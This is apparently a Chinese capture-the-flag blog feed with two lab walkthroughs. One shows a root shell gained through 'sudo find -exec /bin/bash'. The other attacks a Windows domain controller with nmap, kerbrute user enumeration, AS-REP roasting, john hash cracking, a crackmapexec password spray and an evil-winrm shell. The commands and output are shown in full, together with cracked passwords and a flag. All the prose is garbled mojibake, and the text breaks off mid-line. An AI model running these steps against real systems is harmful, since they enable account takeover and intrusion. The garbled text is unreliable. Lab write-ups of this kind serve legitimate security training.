â–ˆâ–ˆâ–ˆ <br> â–„â–ˆâ–ˆâ–ˆâ–„â–„â–„â–„â–ˆâ–ˆâ–ˆâ–„â–„ â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆ <br>â–€â–€â–ˆâ–ˆâ–ˆâ–€â–€â–€â–€â–ˆâ–ˆâ–ˆâ–€  â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆ <br>  â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆ <br>  â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆ <br>  â–ˆâ–ˆâ–ˆ    â–ˆâ–€     â–€â–ˆ   â–ˆâ–ˆâ–ˆ   â–ˆâ–€   â–€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–€  <br>                                        <br>HackMyVM<br>Flag User ::  82kd8FJ5SJ00HMVUS3R36gd<br></code></pre></td></tr></table></figure><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>sudo-læŸ¥çœ‹å¯ç”¨å‘½ä»¤ï¼Œå‘ç°findã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">shelly@NexusLabCTF:~/SA$ sudo -l<br>sudo: unable to resolve host NexusLabCTF: Fallo temporal en la resoluciÃ³n del nombre<br>Matching Defaults entries for shelly on NexusLabCTF:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD, use_pty<br><br>User shelly may run the following commands on NexusLabCTF:<br>    (ALL) NOPASSWD: /usr/bin/find<br><br></code></pre></td></tr></table></figure><p>é‚£ç›´æ¥findææƒç§’äº†ã€‚</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">shelly<span class="hljs-variable">@NexusLabCTF</span><span class="hljs-symbol">:~/SA</span><span class="hljs-variable">$ </span>sudo /usr/bin/find / -exec /bin/bash \;<br><span class="hljs-symbol">sudo:</span> unable to resolve host <span class="hljs-symbol">NexusLabCTF:</span> <span class="hljs-title class_">Fallo</span> temporal en la resoluciÃ³n del nombre<br>root<span class="hljs-variable">@NexusLabCTF</span><span class="hljs-symbol">:/home/shelly/SA</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>åªæ˜¯å®ƒçš„rootflagè—åœ¨å›¾ç‰‡é‡Œï¼Œè½¬æˆbase64å¤åˆ¶è¿‡æ¥è§£ç ä¹Ÿè¡Œï¼Œç›´æ¥ä»é¶æœºä¸‹ä¸‹æ¥010æˆ–è€…å•¥éšå†™å·¥å…·ä¹Ÿè¡Œã€‚</p><p><img src="/2025/06/12/HackMyVM-Nexus/vmware_YOFEbnNlEY.png"></p><p>ä¸è¿‡æœ€ç®€å•ç²—æš´çš„æ–¹æ³•å°±æ˜¯ç›´æ¥catï¼Œå› ä¸ºå®ƒç›´æ¥æŠŠflagæ”¾åœ¨æœ«å°¾äº†ã€‚</p><p><img src="/2025/06/12/HackMyVM-Nexus/vmware_o7GAUboN0z.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnyx-Controler</title>
    <link href="/2025/06/11/Vulnyx-Controler/"/>
    <url>/2025/06/11/Vulnyx-Controler/</url>
    
    <content type="html"><![CDATA[<p>windowsé¶æœºã€‚</p><p>é¶æœºIPï¼š192.168.56.117</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><hr><p>nmapï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -T4 -A -v 192.168.56.117    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-11 04:32 EDT<br>NSE: Loaded 156 scripts for scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 04:32<br>Completed NSE at 04:32, 0.00s elapsed<br>Initiating NSE at 04:32<br>Completed NSE at 04:32, 0.00s elapsed<br>Initiating NSE at 04:32<br>Completed NSE at 04:32, 0.00s elapsed<br>Initiating ARP Ping Scan at 04:32<br>Scanning 192.168.56.117 [1 port]<br>Completed ARP Ping Scan at 04:32, 0.04s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 04:32<br>Completed Parallel DNS resolution of 1 host. at 04:32, 0.04s elapsed<br>Initiating SYN Stealth Scan at 04:32<br>Scanning 192.168.56.117 [1000 ports]<br>Discovered open port 445/tcp on 192.168.56.117<br>Discovered open port 135/tcp on 192.168.56.117<br>Discovered open port 53/tcp on 192.168.56.117<br>Discovered open port 139/tcp on 192.168.56.117<br>Discovered open port 88/tcp on 192.168.56.117<br>Discovered open port 464/tcp on 192.168.56.117<br>Discovered open port 3269/tcp on 192.168.56.117<br>Discovered open port 3268/tcp on 192.168.56.117<br>Discovered open port 636/tcp on 192.168.56.117<br>Discovered open port 389/tcp on 192.168.56.117<br>Discovered open port 593/tcp on 192.168.56.117<br>Completed SYN Stealth Scan at 04:32, 1.46s elapsed (1000 total ports)<br>Initiating Service scan at 04:32<br>Scanning 11 services on 192.168.56.117<br>Completed Service scan at 04:32, 6.22s elapsed (11 services on 1 host)<br>Initiating OS detection (try #1) against 192.168.56.117<br>NSE: Script scanning 192.168.56.117.<br>Initiating NSE at 04:32<br>Completed NSE at 04:33, 8.34s elapsed<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.09s elapsed<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.00s elapsed<br>Nmap scan report for 192.168.56.117<br>Host is up (0.00053s latency).<br>Not shown: 989 closed tcp ports (reset)<br>PORT     STATE SERVICE       VERSION<br>53/tcp   open  domain        Simple DNS Plus<br>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-11 23:32:51Z)<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: control.nyx0., Site: Default-First-Site-Name)<br>445/tcp  open  microsoft-ds?<br>464/tcp  open  kpasswd5?<br>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp  open  tcpwrapped<br>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: control.nyx0., Site: Default-First-Site-Name)<br>3269/tcp open  tcpwrapped<br>MAC Address: 08:00:27:AC:90:5A (Oracle VirtualBox virtual NIC)<br>Device type: general purpose<br>Running: Microsoft Windows 2019<br>OS details: Microsoft Windows Server 2019<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=262 (Good luck!)<br>IP ID Sequence Generation: Incremental<br>Service Info: Host: CONTROLER; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time: <br>|   date: 2025-06-11T23:32:52<br>|_  start_date: N/A<br>| nbstat: NetBIOS name: CONTROLER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:ac:90:5a (Oracle VirtualBox virtual NIC)<br>| Names:<br>|   CONTROLER&lt;00&gt;        Flags: &lt;unique&gt;&lt;active&gt;<br>|   CONTROL&lt;00&gt;          Flags: &lt;group&gt;&lt;active&gt;<br>|   CONTROL&lt;1c&gt;          Flags: &lt;group&gt;&lt;active&gt;<br>|   CONTROLER&lt;20&gt;        Flags: &lt;unique&gt;&lt;active&gt;<br>|_  CONTROL&lt;1b&gt;          Flags: &lt;unique&gt;&lt;active&gt;<br>|_clock-skew: 14h59m57s<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled and required<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.53 ms 192.168.56.117<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.00s elapsed<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.00s elapsed<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 17.70 seconds<br>           Raw packets sent: 1148 (51.210KB) | Rcvd: 1017 (41.350KB)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.56.117 --script vuln<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-11 04:35 EDT<br>Nmap scan report for 192.168.56.117<br>Host is up (0.00040s latency).<br>Not shown: 989 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>53/tcp   open  domain<br>88/tcp   open  kerberos-sec<br>135/tcp  open  msrpc<br>139/tcp  open  netbios-ssn<br>389/tcp  open  ldap<br>445/tcp  open  microsoft-ds<br>464/tcp  open  kpasswd5<br>593/tcp  open  http-rpc-epmap<br>636/tcp  open  ldapssl<br>3268/tcp open  globalcatLDAP<br>3269/tcp open  globalcatLDAPssl<br>MAC Address: 08:00:27:AC:90:5A (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR<br>|_smb-vuln-ms10-054: false<br>|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR<br><br>Nmap done: 1 IP address (1 host up) scanned in 41.07 seconds<br></code></pre></td></tr></table></figure><p>smbç™»å½•çœ‹ä¸€çœ‹æœ‰ä»€ä¹ˆä¸œè¥¿ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nxc smb 192.168.56.117                                        <br>SMB         192.168.56.117  445    CONTROLER        [*] Windows 10 / Server 2019 Build 17763 x64 (name:CONTROLER) (domain:control.nyx) (signing:True) (SMBv1:False)<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°äº†ä¸€ä¸ªåŸŸåï¼Œæ”¾åˆ°hostsé‡Œã€‚</p><p>å°è¯•è¿›è¡Œç”¨æˆ·æ”¶é›†ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs shell">ldapsearch -x -H ldap://192.168.56.117<br><span class="hljs-meta prompt_"># </span><span class="language-bash">extended LDIF</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># LDAPv3</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">base &lt;&gt; (default) with scope subtree</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">filter: (objectclass=*)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">requesting: ALL</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"></span><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">search result</span><br>search: 2<br>result: 1 Operations error<br>text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera<br> tion a successful bind must be completed on the connection., data 0, v4563<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">numResponses: 1</span><br>                                                                                                                                                           <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]<br>â””â”€# rpcclient -U &quot;&quot; -N 192.168.56.117<br>rpcclient $&gt; netshareenum<br>do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; netshareenumall<br>do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; ^C<br>                                                                                                                                                           <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]<br>â””â”€# enum4linux -A 192.168.56.117<br>Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jun 11 04:50:21 2025<br><br> =========================================( Target Information )=========================================<br>                                                                                                                                                           <br>Target ........... 192.168.56.117                                                                                                                          <br>RID Range ........ 500-550,1000-1050<br>Username ......... &#x27;&#x27;<br>Password ......... &#x27;&#x27;<br>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br><br><br> ===========================( Enumerating Workgroup/Domain on 192.168.56.117 )===========================<br>                                                                                                                                                           <br>                                                                                                                                                           <br>[+] Got domain/workgroup name: CONTROL                                                                                                                     <br>                                                                                                                                                           <br>                                                                                                                                                           <br> ==================================( Session Check on 192.168.56.117 )==================================<br>                                                                                                                                                           <br>                                                                                                                                                           <br>[+] Server 192.168.56.117 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;                                                                                   <br>                                                                                                                                                           <br>                                                                                                                                                           <br> ===============================( Getting domain SID for 192.168.56.117 )===============================<br>                                                                                                                                                           <br>Domain Name: CONTROL                                                                                                                                       <br>Domain Sid: S-1-5-21-2142633474-2248127568-3584646925<br><br>[+] Host is part of a domain (not a workgroup)                                                                                                             <br>                                                                                                                                                           <br>enum4linux complete on Wed Jun 11 04:50:21 2025                <br></code></pre></td></tr></table></figure><p>æ— æœï¼Œå°è¯•æš´åŠ›ç ´è§£ã€‚</p><p>ï¼ˆè¿™é‡Œç”¨kaliè‡ªå¸¦çš„ç”¨æˆ·åå­—å…¸è·‘ä¸å‡ºæ¥ï¼Œå¾—æ¢ç½‘ä¸Šä¸“é—¨ç”¨äºç”¨æˆ·æšä¸¾çš„ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">./kerbrute_linux_amd64 userenum -d control.nyx --dc 192.168.56.117 /usr/share/seclists/Usernames/A-Z.Surnames.txt                 <br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \<br> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/<br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: v1.0.3 (9dad6e1) - 06/11/25 - Ronnie Flathers @ropnop<br><br>2025/06/11 05:05:02 &gt;  Using KDC(s):<br>2025/06/11 05:05:02 &gt;   192.168.56.117:88<br><br>2025/06/11 05:05:02 &gt;  [+] VALID USERNAME:       B.LEWIS@control.nyx<br>2025/06/11 05:05:08 &gt;  Done! Tested 13000 usernames (1 valid) in 6.136 seconds<br><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸ªåŸŸç”¨æˆ·ã€‚</p><h3 id="AS-Roasting"><a href="#AS-Roasting" class="headerlink" title="AS-Roasting"></a>AS-Roasting</h3><hr><p>æŸ¥çœ‹è¯¥åŸŸç”¨æˆ·æ˜¯å¦æ— åŸŸè®¤è¯ï¼Œå°è¯•æŠ“å–hashã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">impacket-GetNPUsers control.nyx/B.LEWIS -no-pass <br>/usr/lib/python3/dist-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.<br>  import pkg_resources<br>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies <br><br>[*] Getting TGT for B.LEWIS<br>/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).<br>  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)<br><span class="hljs-meta prompt_">$</span><span class="language-bash">krb5asrep$23<span class="hljs-variable">$B</span>.LEWIS@CONTROL.NYX:673f87866e1253733a78d827c8f76ac2<span class="hljs-variable">$e746876ee8a2b48932bce457c461397d73700cc3eb7625aa9b93a650718753cae7b6a98a73714ca10b3fd380813a817df0bec981b9ae90a137d7810e0ad49a0c3dcc2681222f14338fa58f47e70dbdad8a8ba4e6c65bb3501beeffa74468e24f7c8fa3958af07d0fc03eff16ed59f10025d3705f7ccf55275777862dd59cde593f49475339b9efcf0cfd62806346d3c1e0a7a3b7fc4e4042de01e89fbd28c672e77735baae50064276a4e4979ad6c98dc03c8691d191b34e7c2cf28f26af322cf57aa3ba88fb643f8d937d582dfadac9928a5354cc4db8d1c2c81d28b4e4874628b6e46858feef80849b</span></span><br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">john --format=krb5asrep --wordlist=rockyou.txt hash.txt<br>Using default input encoding: UTF-8<br>Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>101Music         ($krb5asrep$23$B.LEWIS@CONTROL.NYX)     <br>1g 0:00:00:09 DONE (2025-06-11 05:15) 0.1006g/s 1353Kp/s 1353Kc/s 1353KC/s 101eagles..1019904<br>Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br>Session completed. <br><br></code></pre></td></tr></table></figure><p>å°è¯•ç”¨winrmæ‹¿åˆ°shellï¼Œæ— æœã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"> nxc winrm <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span> -u <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.lewis</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">101</span>Music<br>WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">5985</span>   CONTROLER        <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (name:CONTROLER) (domain:control.nyx) <br>WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">5985</span>   CONTROLER        <span class="hljs-selector-attr">[-]</span> control.nyx\<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.lewis</span>:<span class="hljs-number">101</span>Music<br></code></pre></td></tr></table></figure><p>smbç™»ä¸Šå»æŸ¥çœ‹åŸŸå†…ç”¨æˆ·ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">crackmapexec smb 192.168.56.117 -u B.LEWIS -p &#x27;101Music&#x27; --users<br>SMB         192.168.56.117  445    CONTROLER        [*] Windows 10 / Server 2019 Build 17763 x64 (name:CONTROLER) (domain:control.nyx) (signing:True) (SMBv1:False)<br>SMB         192.168.56.117  445    CONTROLER        [+] control.nyx\B.LEWIS:101Music <br>SMB         192.168.56.117  445    CONTROLER        [+] Enumerated domain user(s)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\a.hansen                       badpwdcount: 1 desc: (Account Disabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\d.petrov                       badpwdcount: 1 desc: (Account Disabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\m.klein                        badpwdcount: 1 desc: (Account Disabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\b.lewis                        badpwdcount: 0 desc: (Account Enabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\j.levy                         badpwdcount: 0 desc: (Account Enabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\Guest                          badpwdcount: 0 desc: (Account Disabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\Administrator                  badpwdcount: 0 desc: (Account Enabled)<br><br></code></pre></td></tr></table></figure><p>å‘ç°J.Levyç”¨æˆ·åŒæ ·å¯ç”¨ã€‚</p><p>çˆ†ç ´å¯†ç ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">crackmapexec smb <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span> -u j<span class="hljs-selector-class">.levy</span> -<span class="hljs-selector-tag">p</span> rockyou<span class="hljs-selector-class">.txt</span>         <br>SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">445</span>    CONTROLER        <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:CONTROLER) (domain:control.nyx) (signing:True) (SMBv1:False)<br>SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">445</span>    CONTROLER        <span class="hljs-selector-attr">[-]</span> control.nyx\j<span class="hljs-selector-class">.levy</span>:<span class="hljs-number">123456</span> STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">445</span>    CONTROLER        <span class="hljs-selector-attr">[-]</span> control.nyx\j<span class="hljs-selector-class">.levy</span>:<span class="hljs-number">12345</span> STATUS_LOGON_FAILURE <br>.......<br>SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">445</span>    CONTROLER        <span class="hljs-selector-attr">[+]</span> control.nyx\j<span class="hljs-selector-class">.levy</span>:Password1 <br></code></pre></td></tr></table></figure><p>å¾—åˆ°å¯†ç Password1</p><p>ç”¨winrmå¯ä»¥æ‹¿åˆ°shellã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nxc winrm <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span> -u j<span class="hljs-selector-class">.levy</span> -<span class="hljs-selector-tag">p</span> Password1<br>WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">5985</span>   CONTROLER        <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (name:CONTROLER) (domain:control.nyx) <br>WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">5985</span>   CONTROLER        <span class="hljs-selector-attr">[+]</span> control.nyx\j<span class="hljs-selector-class">.levy</span>:Password1 (Pwn3d!)<br></code></pre></td></tr></table></figure><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs smali">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]<br>â””â”€<span class="hljs-comment"># evil-winrm -i 192.168.56.117 -u &#x27;j.levy&#x27; -p &quot;Password1&quot;               </span><br>                                        <br>Evil-WinRM shell v3.7<br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline<br>                                        <br>Data: For more information,<span class="hljs-built_in"> check </span>Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br>                                        <br>Info: Establishing connection to remote 